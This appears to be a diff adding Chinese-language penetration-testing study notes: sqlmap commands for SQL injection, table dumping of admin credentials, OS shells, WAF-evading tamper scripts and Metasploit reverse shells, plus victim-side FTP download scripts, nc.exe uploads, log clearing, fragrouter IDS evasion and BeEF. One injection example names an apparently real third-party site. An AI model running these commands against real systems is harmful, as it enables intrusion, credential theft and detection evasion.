+driftnet -i eth0 #默认是打开一个显示图片的窗口，然后所有发现的图片都会在上面显示
+可用-a命令使图片不显示在屏幕，改为存储在文件夹中，并显示出文件名 可配合-d指定路径
+	160.Httrack将网站打包到本地（减少交互）
+	161.ssh中有的文件被限制了不能传送，因为没有读取权限
+	162.sqlmap  会自动识别数据库类型，采取合适的方法（如果是nosql应使用nosqlmap）
+	学习网址：http://www.vuln.cn/1992 就是对--help的中文说明
+	测试网址：http://testasp.vulnweb.com/Login.asp
+	-d  对数据库正常连接，不使用注入功能。就是提供了一个数据库连接工具。
+	sqlmap -u "http://xxx?id=7" 直接执行是判断是够可以sql注入
+	-f, --fingerprint 判断DBMS类型
+	-b, --banner 通过banner 进行判断
+	--dbs 枚举数据库  之后命令中使用-D 指定数据库
+	--tables  枚举数据表  之后命令使用-T指定数据表
+	--privileges 显示当前可以使用的命令权限
+	--columns -T 表名字   对指定表名，进行字段的猜解
+	--dump -T admin -C "username,password" 指定表名和字段猜解内容
+	Cookie注入：sqlmap -u "http://www.ntjx.org/jsj/DownloadShow.asp" --cookie "id=9" --table --level 2   
+	表单注入：sqlmap -u http://testasp.vulnweb.com/Login.asp --forms 自动判断，怕不准
+			  sqlmap -u http://testasp.vulnweb.com/Login.asp --data "tfUName=1&tfUPass=1"
+			  -r search-test.txt -p tfUPass 将指定文本用于指定参数
+	sqlmap -u http://testasp.vulnweb.com/Login.asp --os-cmd=ipconfig 之后会进入交互式界面，指定语言、目标站点的根目录，成功以后会执行后面的命令
+	sqlmap -u http://testasp.vulnweb.com/Login.asp --os-shell
+	可以对伪静态页面进行注入（使用了通配符指定注入的地方）：sqlmap -u http://testasp.vulnweb.com/40*.html --os-cmd=shell
+	网站会对多次访问错误的用户重定向已经
+		--delay=秒数（这是HTTP延时，--time-sec=指定DBMS response 默认已经设定是5s，所以一般不需要管理）
+		--safe-freq=一个URL  每两次测试的中间都会去访问这个URL
+	数据库交互界面：--sql-shell 返回进入数据库shell的交互模式，这时候select benmack(999999999999, 0xxxxxxxx) 就会使得数据库报错或者暂停
+		这种工具是为了方便不需要安装对应的连接程序
+	Google 注入：sqlmap -g inurl:php?id=  于是进入一个交互式界面，其中给出一个个网址问你要不要注入
+	绕过WAF: 使用提供的脚本对注入进行编码。
+		--batch --tamper 脚本名字
+		--batch   不询问User，使用默认配置
+		--update  跟新脚本
+		可选脚本：space2morehash.py bash64encode.py charencode.py
+	配合msf使用，反弹shell：--os-pwn --msf-path /usr/share/metasploit-framework/ --priv-esc -v 1
+	可以控制数据库中的UDF、存储过程
+	可以访问文件系统上传下载，注册表，shell
+	可以与google、bp、msf、w3af结合使用
+	PS:传闻sqlmap对站点的注入结果是有缓存的。
+	163.文件骚操作：
+	upx 加壳命令
+	exe2hex  转换exe文件为bat、posh（powershell文件），文本文件（里面是输出十六进制的echo命令，执行输出dll文件，你可以通过copy命令得到exe文件）。支持转换前对文件先进行压缩。
+	通过上传nc.exe以后然后来上传其他的文件。
+	上传到ftp、tftp服务器上面，然后下载过来，需要清除日志
+		创建tftp服务器于kali：
+			atftpd --daemon --port 69 希望分享的目录路径
+			chown -R nobody 目录路劲  将nobody匿名访问的权限给出（改变所有者），从而支持tftp
+		创建ftp服务器与kali：
+			apt install pure-ftpd
+			受害机中：
+				echo  open IP PORT > ftp.txt
+				echo USERNAME >> ftp.txt
+				echo PASSWD >> ftp.txt
+				echo BIN >> ftp.txt //表示使用二进制的传输方式来传输文件
+				echo GET xxx >> ftp.txt
+				echo bye >> ftp.txt //断开与ftp服务器的连接
+				ftp -s:ftp.txt
+	164.fragrouter 绕过IDS：   这个工具是网络入侵检测系统(NIDS)性能测试套件--nidsbench一个部分
+		fragrouter就是基于该漏洞开发的规避工具。该工具可以拦截发送给网卡的数据，进行重新分片（22中分片方式），然后再发送。这些分片方式采用乱序、重复分片、空包、交叉发包等措施，以规避检测系统。
+		使用示例：fragrouter -i eth0 -F1&
+	165.beef浏览器攻击框架
+			
+在线病毒检测:
+www.virustotal.com
+habo.qq.com 一个对软件行为检测（进程行为、文件行为、网络行为、注册表行为、其他）很完整的平台
+	
+移动端仿kali套件：	
+Kali NetHunter
